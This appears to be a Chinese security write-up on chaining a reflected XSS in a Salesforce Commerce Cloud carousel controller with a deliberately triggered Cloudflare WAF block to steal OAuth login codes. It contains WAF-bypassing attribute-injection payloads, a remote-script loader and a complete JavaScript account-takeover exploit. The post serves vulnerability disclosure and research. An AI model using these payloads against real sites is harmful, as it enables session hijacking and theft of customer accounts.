#  利用WAF窃取Salesforce OAuth令牌  
 TtTeam   2026-03-02 01:11  
  
XSS 和 SFRA  
  
Salesforce Commerce Cloud 提供成熟的安全基线，因此漏洞通常隐藏在商家自定义设置中，特别是自定义模板或组件中。在本例中，端点会根据请求参数提供的配置来渲染特定组件。  
  
SFRA（店铺参考架构）控制器EinsteinCarousel-Load就是一个典型的例子。该控制器允许店铺动态加载轮播图部分的推荐产品，它需要两个参数：  
  
limit - 表示轮播图中显示的最大推荐数量。  
  
components - 一个 JSON 编码的组件配置对象数组，用于定义轮播图的渲染方式。  
  
由于该components参数直接控制渲染输出，如果攻击者能够篡改它，它就可能成为一个注入点。通过查看我的 Caido 历史记录，我发现了一些使用此控制器的请求，其内容如下所示：  
  
```
端点-GET /on/demandware.store/Sites-Redacted-Site/en/EinsteinCarousel-Load?components=参数components值：[{    "template":"product/productTileCarouselSlide",    "mainColor":"#000001",    "model":{        "type":"product",        "id":"7919757"    }}]    
```  
  
  
服务器将此内容渲染成如下 HTML：  
```
<button data-border='1px solid #000001' data-background='#000001' class="w-btn w-quantity-btn w-increase-quantity-btn" @click="updateQuantity" :disabled="isMaxQtyReached || !isPriceAvailable || isMaxInventoryReached" aria-label="Increase">
```  
  
通过调整键值，mainColor我们可以看到输入的内容以属性值的形式反映在渲染后的 HTML 中，位于一个标签内。我确认，通过将其更改为：button可以跳出属性上下文。  
```
<button data-border='1px solid #000001' x=x y='' data-background='#000001' x=x y='' class="w-btn w-quantity-btn w-increase-quantity-btn" @click="updateQuantity" :disabled="isMaxQtyReached || !isPriceAvailable || isMaxInventoryReached" aria-label="Increase">
```  
  
接下来，我们需要构建一个能够绕过属性上下文执行 JavaScript 的有效载荷。然而，我们被限制在标签内部，而 Cloudflare WAF 拦截了许多常见的攻击模式。这意味着我必须找到未被过滤且可以在现有标签内使用的特定属性。PortSwigger XSS 速查表button是获取此类有效载荷的绝佳资源。  
  
经过一些测试，我发现这种方法oncontentvisibilityautostatechange可行，但仍然受到 WAF 过滤的限制。WAF 屏蔽了诸如 `<string>` 之类的关键字focus以及少数几个可用于此事件的模式的关键部分。然而，我通过使用Unicode转义（例如，` <string>` ）style成功绕过了过滤器。之所以有效，是因为后端通过 `<string>` 处理输入，如控制器代码所示：  
```
// app_storefront_base/cartridge/controllers/EinsteinCarousel.js:25    server.get('Load', function (req) {        var newFactory = require('*/cartridge/scripts/factories/product');        var URLUtils = require('dw/web/URLUtils');        var components = (JSON.parse(req.querystring.components));        var limit = parseInt(req.querystring.limit, 10);        var successfulrenderings = 0;// ...
```  
  
基于此，我们可以发送以下有效载荷来实现 XSS 攻击：  
```
[{    "template":"product/productTileCarouselSlide",    "mainColor":"#000001' oncontentvisibilityautostatechange='confirm``' \u0073tyle='display:block;content-visibility:auto",    "model":{        "type":"product",        "id":"7919757"    }}]    
```  
```
<button data-border='1px solid #000001' oncontentvisibilityautostatechange='confirm``' style='display:block;content-visibility:auto' data-background='#000001' oncontentvisibilityautostatechange='confirm``' style='display:block;content-visibility:auto' class="w-btn w-quantity-btn w-increase-quantity-btn" @click="updateQuantity" :disabled="isMaxQtyReached || !isPriceAvailable || isMaxInventoryReached" aria-label="Increase">
```  
  
注意： oncontentvisibilityautostatechange仅在带有 <style> 的元素上触发content-visibility:auto，因此注入的 CSSstyle启用了该事件并触发了内联处理程序。  
  
现在的目标是将这种受限的 XSS 攻击转化为更“灵活”的攻击方式，使我们能够迭代改进而无需不断与过滤器抗衡。一种简单直接的方法是从远程源加载代码，所以我创建了一个带有源的<script>标签来实现这一点。最终的有效载荷如下所示：  
```
oncontentvisibilityautostatechange='document.head.appendChild(document.createElement(`script`)).src=`REMOTE_INSTANCE/analysis.js`' \u0073tyle='display:block;content-visibility:auto
```  
  
使用 OAuth 登录  
  
是时候升级行动了。我们有哪些选择？  
- 窃取会话 cookie 是不可能的，因为 Salesforce 强制使用 HttpOnly cookie。  
  
- Cookie 攻击（例如 Cookie Jar Overflow、Cookie Tossing 或 Cookie Sandwich）不适用。  
  
- 由于需要知道受害者当前的密码，因此无法更改其电子邮件地址和密码。  
  
然而，其中一项功能引起了我的注意：该应用程序允许通过 Google 或 Facebook 进行单点登录 (SSO)。  
  
让我们来看一下这个 Salesforce 实例中的流程：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0wJVoTDXBBmfvFW22Gya6VMfsCvZDqDLUsyRGn8jj9WufVWHGqHUVp1EDYdcevgl4GrGld6mib8CjW2AkAKrUJA/640?wx_fmt=png&from=appmsg "")  
  
注意：深入探讨OIDC 授权码流程超出了本文的范围，但这里有一个很好的概述。  
  
如您所见，此处使用的流程是OIDC 登录的授权码流程。与“标准 OAuth”用例（授权：授予应用访问您数据的权限）不同，此流程主要用于身份验证（登录）。Google 会验证您的身份，身份提供商 (IdP)则作为中间环节，处理登录并将结果返回给网站。步骤概述如下：  
1. redacted.com重定向到identity.redacted.com以启动登录。  
  
1. 身份提供商 ( identity.redacted.com ) 将浏览器重定向到 Google 进行身份验证。  
  
1. Google 对用户进行身份验证，并将用户重定向回身份提供商 (IdP)，同时返回代码和状态。  
  
1. 身份提供商验证结果，链接/映射用户，并通过重定向回redacted.comLogin-OAuthReentry。  
  
1. Login-OAuthReentry兑换代码，在redacted.com上创建会话，并登录用户。  
  
1. 最后，网站重定向到目标页面，从 URL 中删除代码/状态。  
  
我们的目标是在身份提供商 (IdP) 重定向回我们的源服务器时拦截 ` codeand`state参数。利用这些值，我们可以获取一个账户会话并实现账户接管。为此，我们必须在步骤 5停止重定向链，因为 `and` 参数code是一次性使用的。  
  
分析 OAuth 流程时，我首先想到的是参考Detectify或Doyensec关于 OAuth 滥用的出色研究。遗憾的是，中间身份提供商(IdP)的存在阻止了他们所描述的攻击，因为我们的 XSS 漏洞仅存在于源端redacted.com，而不存在于目标端identity.redacted.com。  
  
与WAF合作  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0wJVoTDXBBmfvFW22Gya6VMfsCvZDqDL0Rr5UBPl3DR7gtCTlPib0m17RcvLx969yy4NFoAiaDC7hwQLteFBeZOA/640?wx_fmt=png&from=appmsg "")  
  
我们的想法是利用Cloudflare WAF，通过植入一个“恶意”cookie 来阻止回调中的重定向Login-OAuthReentry。这样可以防止代码和状态参数被获取，从而使我们能够通过 XSS 攻击窃取它们，因为我们已经返回到源站。以下是我们需要执行的步骤：  
- 我们强制受害者登出，并从 HTML 中获取idP google URL /account/login。  
  
- 在受害者的 cookie 罐中添加一个“恶意” cookie，以便在请求返回到我们的源时触发 WAF 阻止。  
  
- iframe通过插入指向 IdP 登录 URL 的链接来启动 OAuth 流程。  
  
- 等待 iframe 加载重定向回我们的源页面。  
  
- 从 iframe URL 中窃取未使用的code参数。state  
  
以下是攻击和利用的整体概览：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0wJVoTDXBBmfvFW22Gya6VMfsCvZDqDLyhVmwtdoictt8pszZBs5TqJ6MsvarqNZUtfoGaqzHFOvNmiaUCWyP3eg/640?wx_fmt=png&from=appmsg "")  
```
(async () => {

    // logout victim    await fetch('/on/demandware.store/Sites-Redacted-Site/en_US/Login-Logout');

    // get IdP login URL    const r = await fetch("/account/login").then(r => r.text());    const p = new DOMParser().parseFromString(r, "text/html");    const src = p.querySelector("a[data-social-provider='google'][data-idm-redirect]")        .getAttribute("data-idm-redirect");

    // "malicious" cookie to trigger WAF    document.cookie="x=' OR 1=1 -- ";

    // start OAuth flow    document.body.innerHTML = `<iframe id="x" src="${src}"></iframe>`;    const x = document.getElementById("x");    await new Promise(r => x.onload = r);

    // steal code + state    const u = new URL(x.contentWindow.location.href);    const c = u.searchParams.get("code");     const s = u.searchParams.get("state");

    console.log("[+] Session Code = " + c);    console.log("[+] Session state = " + s);

})();
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0wJVoTDXBBmfvFW22Gya6VMfsCvZDqDLkOPib0hqFGzqbw1JfuI9DZYsGib5P4icic8FrCeVgwOyApgcsUZqb0B3ww/640?wx_fmt=png&from=appmsg "")  
  
最后说明  
  
正如演示所示，WAF 拦截不仅是一种安全控制措施，它还可以在关键时刻可靠地中断 OAuth 流程。  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
